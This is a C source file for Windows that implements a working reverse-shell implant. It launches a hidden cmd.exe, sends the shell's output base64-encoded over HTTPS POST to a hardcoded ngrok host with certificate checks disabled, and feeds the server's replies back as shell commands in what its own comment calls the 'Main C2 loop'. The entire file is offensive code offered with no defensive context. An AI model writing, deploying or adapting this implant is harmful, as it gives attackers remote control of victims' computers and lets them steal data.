#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdio.h>

/* -------------------------------------------------------------------------
 * Configuration
 * ---------------------------------------------------------------------- */
#define TARGET_HOST     L"theft-scooter-wrench.ngrok-free.dev"
#define TARGET_PORT     443
#define TARGET_PATH     L"/"
#define CHILD_CMD       "cmd.exe"

#define PIPE_BUFSIZE    2000
#define BODY_BUFSIZE    (PIPE_BUFSIZE + 50)
#define RESP_BUFSIZE    1024

#define RETRY_DELAY_MS  2000
#define POLL_DELAY_MS   500

/* -------------------------------------------------------------------------
 * base64_encode_winapi
 *
 * Encodes `data_len` bytes from `data` into a newly malloc'd,
 * NUL-terminated base64 string written to *out.
 * Returns TRUE on success, FALSE on any failure.
 * Caller must free(*out) when done.
 * ---------------------------------------------------------------------- */
static BOOL base64_encode_winapi(const BYTE *data, DWORD data_len, char **out)
{
    DWORD out_len = 0;

    if (!data || !out)
        return FALSE;

    *out = NULL;

    /* First call: query required buffer size */
    CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len);

    *out = (char *)malloc(out_len);

    /* Second call: fill the buffer */
    CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *out, &out_len);

    return TRUE;
}

/* -------------------------------------------------------------------------
 * connect_to_server
 *
 * Opens a fresh hConnect on the existing hSession.
 * Returns NULL on failure (caller should retry or abort).
 * ---------------------------------------------------------------------- */
static HINTERNET connect_to_server(HINTERNET hSession)
{
    HINTERNET hConnect = WinHttpConnect(hSession, TARGET_HOST, TARGET_PORT, 0);
    if (!hConnect)
        fprintf(stderr, "[http] WinHttpConnect failed: %lu\n", GetLastError());
    return hConnect;
}

/* -------------------------------------------------------------------------
 * open_request
 *
 * Opens a POST request handle and applies the TLS ignore flags.
 * Returns NULL on failure.
 * ---------------------------------------------------------------------- */
static HINTERNET open_request(HINTERNET hConnect)
{
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        TARGET_PATH,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    if (!hRequest) {
        fprintf(stderr, "[http] WinHttpOpenRequest failed: %lu\n", GetLastError());
        return NULL;
    }

    DWORD flags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &flags, sizeof(flags))) {
        fprintf(stderr, "[http] WinHttpSetOption (tls flags) failed: %lu\n",
                GetLastError());
        WinHttpCloseHandle(hRequest);
        return NULL;
    }

    return hRequest;
}

/* -------------------------------------------------------------------------
 * main
 * ---------------------------------------------------------------------- */
int main(void)
{
    /* ------------------------------------------------------------------
     * 1. WinHTTP session
     * ---------------------------------------------------------------- */
    HINTERNET hSession = WinHttpOpen(
        L"MyHttpClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) {
        fprintf(stderr, "[http] WinHttpOpen failed: %lu\n", GetLastError());
        return 1;
    }


    HINTERNET hConnect = connect_to_server(hSession);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* ------------------------------------------------------------------
     * 2. Pipes
     * ---------------------------------------------------------------- */
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength              = sizeof(sa);
    sa.bInheritHandle       = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE childStdoutRead  = NULL, childStdoutWrite = NULL;
    HANDLE childStdinRead   = NULL, childStdinWrite  = NULL;

    if (!CreatePipe(&childStdoutRead, &childStdoutWrite, &sa, 0)) {
        fprintf(stderr, "[pipe] CreatePipe (stdout) failed: %lu\n", GetLastError());
        goto cleanup_http;
    }

    if (!CreatePipe(&childStdinRead, &childStdinWrite, &sa, 0)) {
        fprintf(stderr, "[pipe] CreatePipe (stdin) failed: %lu\n", GetLastError());
        goto cleanup_stdout_pipe;
    }

    /*
     * Parent-side read end must NOT be inherited by the child;
     * otherwise ReadFile on it blocks forever when the child exits.
     */
    if (!SetHandleInformation(childStdoutRead, HANDLE_FLAG_INHERIT, 0)) {
        fprintf(stderr, "[pipe] SetHandleInformation failed: %lu\n", GetLastError());
        goto cleanup_all_pipes;
    }

    /* ------------------------------------------------------------------
     * 3. Child process
     * ---------------------------------------------------------------- */
    STARTUPINFOA sinfo = {0};
    sinfo.cb          = sizeof(sinfo);
    sinfo.dwFlags     = STARTF_USESTDHANDLES;
    sinfo.hStdOutput  = childStdoutWrite;
    sinfo.hStdError   = childStdoutWrite;
    sinfo.hStdInput   = childStdinRead;

    PROCESS_INFORMATION pinfo = {0};

    char cmdline[] = CHILD_CMD;

    CreateProcessA(NULL, cmdline, NULL, NULL,
                        TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &sinfo, &pinfo);

    /* Parent closes its copy of the child-side write end immediately;
     * ReadFile will return 0 bytes when the child exits rather than hanging. */
    CloseHandle(childStdoutWrite); childStdoutWrite = NULL;
    CloseHandle(pinfo.hThread);    pinfo.hThread    = NULL;

    /* ------------------------------------------------------------------
     * 4. Main C2 loop
     * ---------------------------------------------------------------- */
    char     body[BODY_BUFSIZE];
    char     response[RESP_BUFSIZE];
    HINTERNET hRequest = NULL;

    while (1) {

        /* ---- 4a. Build request body from pipe output ---- */
        ZeroMemory(body, sizeof(body));

        DWORD bytesAvailable = 0;
        PeekNamedPipe(childStdoutRead, NULL, 0, NULL, &bytesAvailable, NULL);

        if (bytesAvailable > 0) {
            char  pipeBuf[PIPE_BUFSIZE + 1];
            DWORD toRead   = bytesAvailable > PIPE_BUFSIZE
                             ? PIPE_BUFSIZE : bytesAvailable;
            DWORD bytesRead = 0;

            ZeroMemory(pipeBuf, sizeof(pipeBuf));

            ReadFile(childStdoutRead, pipeBuf, toRead, &bytesRead, NULL);
            pipeBuf[bytesRead] = '\0';

            char *b64 = NULL;
            if (base64_encode_winapi((const BYTE *)pipeBuf, bytesRead, &b64)) {
                snprintf(body, sizeof(body), "{\"message\":\"%s\"}", b64);
                free(b64);
                b64 = NULL;
            } else {
                /* Encoding failed — send empty message, keep the loop alive */
                strncpy(body, "{\"message\":\"\"}", sizeof(body) - 1);
            }
        } else {
            /* Nothing to send yet — heartbeat so the server knows we're alive */
            strncpy(body, "{\"message\":\"\"}", sizeof(body) - 1);
        }

        DWORD bodyLen = (DWORD)strlen(body);

        /* ---- 4b. Open a fresh request handle for this iteration ---- */
        hRequest = open_request(hConnect);
        if (!hRequest) {
            /* Connection may be stale — reconnect once and retry */
            WinHttpCloseHandle(hConnect);
            hConnect = connect_to_server(hSession);
            if (!hConnect) {
                fprintf(stderr, "[http] reconnect failed, retrying in %d ms\n",
                        RETRY_DELAY_MS);
                Sleep(RETRY_DELAY_MS);
                hConnect = connect_to_server(hSession);
                if (!hConnect)
                    break;      /* Give up after one reconnect attempt */
            }

            hRequest = open_request(hConnect);
            if (!hRequest) {
                fprintf(stderr, "[http] open_request failed after reconnect\n");
                Sleep(RETRY_DELAY_MS);
                continue;
            }
        }

        /* ---- 4c. Send ---- */
        LPCWSTR headers = L"Content-Type: application/json\r\n";

        if (!WinHttpSendRequest(hRequest, headers, (DWORD)-1L,
                                (LPVOID)body, bodyLen, bodyLen, 0)) {
            fprintf(stderr, "[http] WinHttpSendRequest failed: %lu\n",
                    GetLastError());
            WinHttpCloseHandle(hRequest); hRequest = NULL;
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            fprintf(stderr, "[http] WinHttpReceiveResponse failed: %lu\n",
                    GetLastError());
            WinHttpCloseHandle(hRequest); hRequest = NULL;
            Sleep(RETRY_DELAY_MS);
            continue;
        }

        /* ---- 4d. Read response and forward to child stdin ---- */
        DWORD size = 0;
        do {
            if (!WinHttpQueryDataAvailable(hRequest, &size)) {
                fprintf(stderr, "[http] WinHttpQueryDataAvailable failed: %lu\n",
                        GetLastError());
                break;
            }

            if (size == 0)
                break;

            DWORD clampedSize = size > (RESP_BUFSIZE - 1)
                                ? (RESP_BUFSIZE - 1) : size;

            DWORD downloaded = 0;
            ZeroMemory(response, sizeof(response));

            if (!WinHttpReadData(hRequest, response, clampedSize, &downloaded)) {
                fprintf(stderr, "[http] WinHttpReadData failed: %lu\n",
                        GetLastError());
                break;
            }

            response[downloaded] = '\0';

            DWORD written = 0;
            if (!WriteFile(childStdinWrite, response, downloaded, &written, NULL)) {
                fprintf(stderr, "[pipe] WriteFile (stdin) failed: %lu\n",
                        GetLastError());
                break;
            }

        } while (size > 0);

        WinHttpCloseHandle(hRequest);
        hRequest = NULL;

        Sleep(POLL_DELAY_MS);
    }

    /* ------------------------------------------------------------------
     * 5. Cleanup
     * ---------------------------------------------------------------- */
    if (hRequest)  WinHttpCloseHandle(hRequest);

    TerminateProcess(pinfo.hProcess, 0);
    CloseHandle(pinfo.hProcess);
    CloseHandle(childStdinWrite);
    CloseHandle(childStdinRead);
    CloseHandle(childStdoutRead);

cleanup_all_pipes:
    if (childStdinWrite)  CloseHandle(childStdinWrite);
    if (childStdinRead)   CloseHandle(childStdinRead);

cleanup_stdout_pipe:
    if (childStdoutRead)  CloseHandle(childStdoutRead);
    if (childStdoutWrite) CloseHandle(childStdoutWrite);

cleanup_http:
    if (hConnect) WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}